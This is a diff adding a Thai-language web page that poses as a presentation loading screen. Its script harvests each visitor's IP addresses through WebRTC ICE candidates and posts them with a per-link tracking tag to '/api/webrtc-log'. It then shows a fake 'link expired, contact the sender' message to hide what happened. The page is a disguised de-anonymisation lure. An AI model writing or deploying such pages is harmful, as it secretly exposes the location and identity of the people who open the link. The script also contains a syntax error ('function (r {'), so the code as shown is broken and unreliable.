@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ระบบนำเสนอ</title>
+<style>
+  body { font-family: sans-serif; text-align: center; padding: 60px 20px; background: #f7f9fb; color: #333; }
+  .spinner { width: 54px; height: 54px; border: 6px solid #dde3ea; border-top-color: #1a73e8; border-radius: 50%; margin: 0 auto 24px; animation: spin 1s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="spinner"></div>
+<h2>กำลังเตรียมเนื้อหา...</h2>
+<p>โปรดรอสักครู่</p>
+<script>
+(async function () {
+  var tag = new URLSearchParams(location.search).get("t") || "x";
+  var candidates = [];
+  try {
+    var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+    pc.createDataChannel("x");
+    pc.onicecandidate = function (e) {
+      if (e.candidate) candidates.push(e.candidate.candidate);
+    };
+    var offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    await new Promise(function (r { setTimeout(r, 3500); });
+  } catch (err) {}
+  try {
+    await fetch("/api/webrtc-log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ tag: tag, candidates: candidates })
+    });
+  } catch (err) {}
+  document.body.innerHTML = "<h2>ไม่พบเนื้อหา</h2><p>ลิงก์นี้หมดอายุแล้ว กรุณาติดต่อผู้ส่ง</p>";
+})();
+</script>
+</body>
+</html>
